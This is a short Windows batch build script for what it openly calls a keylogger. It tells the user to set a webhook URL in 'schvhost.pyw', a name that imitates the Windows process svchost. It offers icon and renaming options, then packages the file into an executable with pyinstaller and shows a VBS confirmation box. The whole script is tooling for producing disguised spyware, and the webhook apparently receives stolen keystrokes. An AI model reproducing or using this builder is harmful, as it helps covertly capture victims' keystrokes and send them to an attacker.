echo off
color a
cls
echo.
echo Before you must set up the webhook url in: schvhost.pyw
echo in line: 7
echo.
pause
color c
cls
echo.
echo If you want to set up icon replace .icon file with your icon
echo !Icon must be .ico file!
echo.
echo If you want default dont remove anything!
echo.
pause
color a
cls
echo.
echo If you want rename your keylogger rename the schvhost.pyw to yourname.pyw
echo.
pause
color f
cls
pyinstaller --icon=icon.ico schvhost.pyw
cd "%temp%
echo X=MsgBox("schvhost.pyw has been coverted to .exe", 0+64, "Build.bat") >> msg1.vbs
start msg1.vbs
timeout /t 1 /nobreak >nul
del msg1.vbs
exit